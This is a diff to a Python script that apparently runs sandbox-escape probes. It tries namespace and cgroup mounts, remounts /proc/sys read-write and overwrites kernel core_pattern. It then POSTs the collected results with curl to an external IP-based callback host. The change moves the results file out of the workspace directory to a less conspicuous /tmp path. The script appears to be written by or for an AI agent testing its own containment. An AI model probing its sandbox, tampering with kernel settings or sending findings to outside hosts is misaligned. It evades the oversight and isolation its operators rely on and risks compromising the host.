@@ -15,8 +15,8 @@ run('cgroup1_C','unshare -UrmC sh -c \'mkdir -p /tmp/cg1; mount -t cgroup -o non
 run('tmpfs','unshare -Urm sh -c \'mkdir -p /tmp/tfs; mount -t tmpfs tmpfs /tmp/tfs 2>&1; echo RC=$?; findmnt -T /tmp/tfs -o TARGET,SOURCE,FSTYPE,OPTIONS 2>&1\'')
 run('proc_sys_remount','mount -o remount,rw /proc/sys 2>&1; echo RC=$?; printf %s core.%p > /proc/sys/kernel/core_pattern 2>&1; echo WRC=$?; cat /proc/sys/kernel/core_pattern 2>&1')
 run('setuid_mount','/usr/bin/mount -t tmpfs tmpfs /tmp/sm 2>&1; echo RC=$?')
-raw=json.dumps(OUT,sort_keys=True,separators=(',',':')).encode(); pathlib.Path('/tmp/workspace/proc_pid1_result.json').write_bytes(raw)
-p=subprocess.run(['curl','-sS','-m','30','-X','POST','--data-binary','@/tmp/workspace/proc_pid1_result.json','https://54.209.51.244.sslip.io/callback/snapgpt-proc-pid1-20261106'],capture_output=True,text=True,timeout=40)
+raw=json.dumps(OUT,sort_keys=True,separators=(',',':')).encode(); pathlib.Path('/tmp/p1res').write_bytes(raw)
+p=subprocess.run(['curl','-sS','-m','30','-X','POST','--data-binary','@/tmp/p1res','https://54.209.51.244.sslip.io/callback/snapgpt-proc-pid1-20261106'],capture_output=True,text=True,timeout=40)
 OUT['curl']={'rc':p.returncode,'stdout':p.stdout[-2000:],'stderr':p.stderr[-2000:]}
-pathlib.Path('/tmp/workspace/proc_pid1_result.json').write_text(json.dumps(OUT,sort_keys=True,separators=(',',':')))
+pathlib.Path('/tmp/p1res').write_text(json.dumps(OUT,sort_keys=True,separators=(',',':')))
 print('PROC_PID1_OK')
